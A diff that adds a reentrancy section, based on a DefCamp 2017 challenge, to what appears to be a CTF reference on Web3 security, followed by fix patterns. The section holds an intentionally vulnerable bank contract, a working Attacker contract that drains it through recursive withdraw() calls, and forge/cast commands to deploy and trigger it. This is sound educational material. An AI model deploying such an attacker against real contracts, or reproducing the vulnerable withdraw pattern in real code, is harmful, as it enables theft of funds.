@@ -13,6 +13,7 @@
 - [Groth16 Proof Forgery for Blockchain Governance (DiceCTF 2026)](#groth16-proof-forgery-for-blockchain-governance-dicectf-2026)
 - [Phantom Market Unresolve + Force-Funding (DiceCTF 2026)](#phantom-market-unresolve--force-funding-dicectf-2026)
 - [Solidity Transient Storage Clearing Helper Collision (Solidity 0.8.28-0.8.33)](#solidity-transient-storage-clearing-helper-collision-solidity-0828-0833)
+- [Reentrancy Attack - DAO Pattern (DefCamp 2017)](#reentrancy-attack---dao-pattern-defcamp-2017)
 - [Web3 CTF Tips](#web3-ctf-tips)
 
 ---
@@ -280,6 +281,82 @@ solc --via-ir --ir Contract.sol > yul_output.txt
 **Workaround:** Replace `delete _lock` with `_lock = address(0)` — direct zero assignment uses the correct opcode path.
 
 **Key insight:** The bug requires all three conditions: `--via-ir` compilation, `delete` on a transient variable, and a matching-type persistent `delete` in the same compilation unit. No compiler warning is produced, and incorrect storage operations do not revert — they silently corrupt state.
+
+---
+
+## Reentrancy Attack - DAO Pattern (DefCamp 2017)
+
+**Pattern:** A `withdraw()` function sends ETH via `msg.sender.call.value(amount)()` before updating the sender's balance. A malicious contract's fallback function re-calls `withdraw()` recursively, draining funds before the balance is ever zeroed.
+
+```solidity
+// Vulnerable contract:
+contract VulnerableBank {
+    mapping(address => uint) public balances;
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint amount = balances[msg.sender];
+        require(amount > 0);
+        // BUG: sends ETH before updating state
+        (bool success,) = msg.sender.call{value: amount}("");
+        require(success);
+        balances[msg.sender] = 0;   // too late — attacker re-entered before this line
+    }
+}
+```
+
+```solidity
+// Attacker contract:
+contract Attacker {
+    VulnerableBank public target;
+    uint public count;
+
+    constructor(address _target) {
+        target = VulnerableBank(_target);
+    }
+
+    function attack() external payable {
+        target.deposit{value: msg.value}();
+        target.withdraw();
+    }
+
+    // Fallback: re-enters withdraw() while balance hasn't been zeroed yet
+    receive() external payable {
+        if (count < 10 && address(target).balance >= msg.value) {
+            count++;
+            target.withdraw();   // re-entrant call
+        }
+    }
+}
+```
+
+```python
+# Deploy and trigger via web3.py / Foundry:
+# forge create Attacker --constructor-args $VULNERABLE_ADDR --rpc-url $RPC --private-key $KEY
+# cast send $ATTACKER "attack()" --value 1ether --rpc-url $RPC --private-key $KEY
+```
+
+**Fix patterns:**
+```solidity
+// Option 1: Checks-Effects-Interactions (zero balance BEFORE sending)
+function withdraw() public {
+    uint amount = balances[msg.sender];
+    require(amount > 0);
+    balances[msg.sender] = 0;           // effect first
+    (bool success,) = msg.sender.call{value: amount}("");
+    require(success);
+}
+
+// Option 2: Use transfer() — gas-limited to 2300 (not enough for re-entry)
+payable(msg.sender).transfer(amount);
+
+// Option 3: ReentrancyGuard (OpenZeppelin)
+```
+
+**Key insight:** External calls via `call.value()` before state updates create reentrancy — the attacker's fallback re-enters the vulnerable function before the first call completes. The DAO hack (2016) drained $60M using this exact pattern. Always zero balances or use a mutex before making external calls.
 
 ---
 
